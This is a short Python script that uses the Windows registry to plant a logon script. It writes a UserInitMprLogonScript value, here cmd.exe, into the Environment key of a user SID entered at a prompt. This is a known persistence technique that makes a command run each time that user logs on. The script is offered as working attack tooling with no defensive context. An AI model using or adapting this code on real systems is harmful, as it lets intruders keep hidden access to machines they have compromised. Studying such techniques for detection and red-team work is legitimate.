import winreg

# reg_hive = winreg.HKEY_CURRENT_USER
# reg_path = "Environment"

reg_hive = winreg.HKEY_USERS
# userSID = "<userSID>" 
userSID = input("Enter User SID: ").strip() # Decided to ask for input rather than hardcoding it
reg_path = f"{userSID}\Environment"

command = "cmd.exe"

try:
    key = winreg.OpenKey(reg_hive, reg_path, 0, access=winreg.KEY_WRITE)
    winreg.SetValueEx(key, "UserInitMprLogonScript", 0, winreg.REG_SZ, command)
    print("Successfully inserted Logon Script.")
except Exception as e:
    print("Failed to insert Logon Script.")
    print(e)